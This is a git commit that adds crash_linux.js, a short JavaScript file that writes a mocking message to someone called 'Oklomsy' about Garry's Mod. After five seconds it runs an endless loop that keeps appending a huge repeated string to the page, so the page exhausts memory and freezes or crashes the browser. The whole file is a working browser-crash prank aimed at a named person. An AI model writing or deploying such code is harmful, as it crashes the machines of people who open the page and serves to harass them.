db52abefbb36a13bbd7d74cb36f15bb5332db40c
Samuel Lord <sllord@icloud.com>
2020-05-20 17:51:10 -0500

    Add files via upload

---
+++ crash_linux.js
@@ -0,0 +1,7 @@
+document.body.innerHTML = document.body.innerHTML + "<h1>Dear Oklomsy, </h1><br><br>You "
+const txt = `don't like Garry's Mod, but you downloaded GMod, thus you like Garry's Mod, yet you `;
+setTimeout(function () {
+	while (1 == 1) {
+		document.body.innerHTML = document.body.innerHTML + `${txt.repeat(99999)}`
+	}
+}, 5000);
